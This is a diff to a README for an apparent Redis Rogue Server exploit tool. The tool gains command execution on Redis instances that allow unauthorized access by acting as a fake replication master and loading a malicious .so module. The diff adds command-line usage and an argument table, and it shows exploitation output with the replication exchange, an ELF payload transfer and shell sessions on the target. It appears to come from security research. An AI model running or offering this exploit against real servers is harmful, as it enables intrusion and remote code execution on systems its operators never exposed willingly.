@@ -1,4 +1,4 @@
-### Awesome Redis Rogue Server Research
+### Awesome Redis Rogue Server Research - Translated - Formatted Usage
 
 This document details research on the **Redis Rogue Server** technique for exploiting Redis instances with unauthorized access. Existing articles often lack a detailed explanation of its principles, so this study dives deeper, improving the existing `Rogue Server` Python exploitation code and `module.c` source code.
 
@@ -60,7 +60,32 @@ Only Rogue Server Mode:
 
 ---
 
-### Example Usage
+## Usage
+
+```bash
+python3 redis_rogue_server.py -rhost [TARGET_IP] -lhost [ROGUE_SERVER_IP] [OPTIONS]
+```
+---
+
+### **Arguments**
+
+| Argument         | Description                                                                                             | Default          |
+|------------------|---------------------------------------------------------------------------------------------------------|------------------|
+| `-rhost`         | **(Required)** Target Redis server IP address.                                                          | None             |
+| `-rport`         | Target Redis server port.                                                                               | `6379`           |
+| `-lhost`         | **(Required)** IP address of the rogue Redis server. Must be accessible from the target.                | None             |
+| `-lport`         | Port for the rogue Redis server to listen on.                                                           | `15000`          |
+| `-passwd`        | Password for the target Redis server (if authentication is enabled).                                    | None             |
+| `-path`          | Path to the malicious `.so` file to upload to the target Redis server.                                  | `module.so`      |
+| `-t`             | Timeout for rogue server response in seconds.                                                          | `3`              |
+| `-s`             | Enables separate mode where the Rogue Server and Redis-Cli run on different systems.                   | Disabled         |
+| `-v`             | Enable verbose mode to display detailed communication between the rogue server and the target Redis.   | Disabled         |
+
+---
+
+## Example Usage
+
+### **Standard Exploitation**
 
 ```bash
 $ python3 redis_rogue_server.py -rhost 192.168.229.136 -lhost 192.168.229.150 -v
@@ -77,7 +102,7 @@ $ python3 redis_rogue_server.py -rhost 192.168.229.136 -lhost 192.168.229.150 -v
 [>>]b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
 [<<]b'+OK\r\n'
 [>>]b'*3\r\n$5\r\nPSYNC\r\n$40\r\ne46ef23509ec51bb952dec34cb84e6c08388e5eb\r\n$1\r\n1\r\n'
-[<<]b'+FULLRESYNC d2b79a2fbd16c050cdf136838f67093efb76509 1\r\n$45608\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00 *\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00...'
+[<<]b'+FULLRESYNC d2b79a2fbd16c050cdf136838f67093efb76509 1\r\n$45608\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00 *\x00\x00\x00\x00\x00\x00@\x00\x00\x00...'
 [*] The Rogue Server Finished Sending the Fake Master Response.
 [*] Wait for Redis IO and transaction flow to close...
 [*] Exploit Step-2.
@@ -96,7 +121,7 @@ $ exit
 
 ---
 
-### Separate Mode
+### **Separate Mode**
 
 - **Rogue Server:** `192.168.229.150`
 - **Attacker:** `192.168.229.136`
@@ -140,6 +165,8 @@ $ id
 uid=1000(test) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
 $ exit
 ```
+
+---
 
 ---
 
